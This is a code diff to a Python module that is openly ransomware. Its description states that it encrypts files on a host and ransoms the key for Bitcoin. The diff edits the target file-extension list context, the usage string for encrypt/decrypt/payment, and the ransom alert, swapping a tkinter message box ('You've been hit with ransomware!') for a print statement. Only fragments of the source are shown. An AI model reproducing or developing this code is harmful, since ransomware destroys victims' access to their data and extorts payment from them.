@@ -13,8 +13,9 @@ import traceback
 import re
 import pickle
 try:
-    import tkinter
-    import tkinter.messagebox
+    # import tkinter
+    # import tkinter.messagebox
+    import os
 except:
     pass
 
@@ -59,7 +60,7 @@ filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.
              '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
              '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
              '.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']
-usage = 'ransom <encrypt/decrypt/payment> [pub key] [priv key]'
+usage = 'ransom <encrypt/decrypt/payment> <file_name> [pub key] [priv key]'
 description = """
 Encrypt the files on a client host machine and ransom the decryption key
 back to the currently logged-in user for a payment in Bitcoin to a randomly
@@ -184,9 +185,10 @@ def request_payment(bitcoin_wallet):
 
     """
     try:
-        root = tkinter.Tk()
-        root.withdraw()
-        tkinter.messagebox.showwarning('Hackers Are Here', "You've been hit with ransomware! I've encrypted you file and will decrypt them once you send bitcoin payment to this address: <> I wouldn't disable anything on this computer or it'll be irrecoverable ;)")
+        # root = tkinter.Tk()
+        # root.withdraw()
+        # tkinter.messagebox.showwarning('Hackers Are Here', "You've been hit with ransomware! I've encrypted you file and will decrypt them once you send bitcoin payment to this address: <> I wouldn't disable anything on this computer or it'll be irrecoverable ;)")
+        print("Hackers are here!")
     except Exception as e:
         print(traceback.format_exc())
         return "Couldn't render alert box with tk"
@@ -476,4 +478,3 @@ def run(args=None):
         encrypted = True
         return encrypt_files(action)
     return usage
-
